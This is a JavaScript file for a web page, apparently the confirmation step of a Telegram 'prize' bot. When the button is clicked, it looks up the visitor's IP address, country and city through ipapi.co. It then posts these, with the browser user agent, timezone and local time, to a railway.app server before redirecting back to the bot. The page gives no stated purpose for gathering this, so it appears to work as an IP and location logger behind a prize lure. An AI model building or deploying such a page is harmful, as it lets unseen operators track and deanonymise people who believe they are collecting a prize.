const SERVER_BASE = "https://uwezertgithubio-production.up.railway.app";
const ENDPOINT = SERVER_BASE + "/confirm";


const BOT_USERNAME = "Check_prizebot"; 

function getUidFromUrl() {
  const p = new URLSearchParams(window.location.search);
  return (p.get("uid") || "").trim();
}

async function getIpData() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    if (!r.ok) return null;
    return await r.json();
  } catch {
    return null;
  }
}

function deepLinkConfirm(uid, cc) {
  const country = (cc || "ZZ").toUpperCase().slice(0, 2);
  // start param: confirm_<uid>_<CC>
  return `https://t.me/${BOT_USERNAME}?start=confirm_${uid}_${country}`;
}

async function sendConfirm() {
  const btn = document.getElementById("confirmBtn");
  const statusEl = document.getElementById("statusText");

  btn.classList.remove("error", "success");

  const uid = getUidFromUrl();
  if (!uid) {
    btn.classList.add("error");
    statusEl.textContent = "❌ Ошибка: в ссылке нет uid. Вернись в бота и нажми кнопку заново.";
    return;
  }

  statusEl.textContent = "Собираем данные…";

  const ipData = await getIpData();
  const cc = (ipData?.country_code || "ZZ").toUpperCase();

  const payload = {
    uid,
    time_utc: new Date().toISOString(),
    time_local: new Date().toLocaleString(),
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    userAgent: navigator.userAgent,
    ip: ipData?.ip || "unknown",
    country: ipData?.country_name || ipData?.country || "unknown",
    country_code: cc,
    city: ipData?.city || "unknown",
    page: location.href,
  };

  statusEl.textContent = "Отправляем на сервер…";

  try {
    const resp = await fetch(ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const text = await resp.text();
    let data = null;
    try { data = JSON.parse(text); } catch {}

    if (!resp.ok) {
      btn.classList.add("error");
      statusEl.textContent = `Ошибка сервера: ${resp.status}. Подробности в консоли.`;
      console.log("SERVER_STATUS:", resp.status);
      console.log("SERVER_BODY:", text);
      return;
    }

    if (data && data.ok === false) {
      btn.classList.add("error");
      statusEl.textContent = `Сервер отклонил запрос: ${data.error || "unknown"}`;
      console.log("SERVER_BODY:", data);
      return;
    }

    btn.classList.add("success");
    statusEl.textContent = "✅ Готово! Сейчас вернём вас в бота…";

    setTimeout(() => {
      window.location.href = deepLinkConfirm(uid, cc);
    }, 700);

  } catch (e) {
    btn.classList.add("error");
    statusEl.textContent = "❌ Ошибка сети (браузер не смог обратиться к серверу). Подробности в консоли.";
    console.log("NETWORK_ERROR:", e);
  }
}

document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById("confirmBtn");
  btn.addEventListener("click", (e) => {
    e.preventDefault();
    sendConfirm();
  });
});
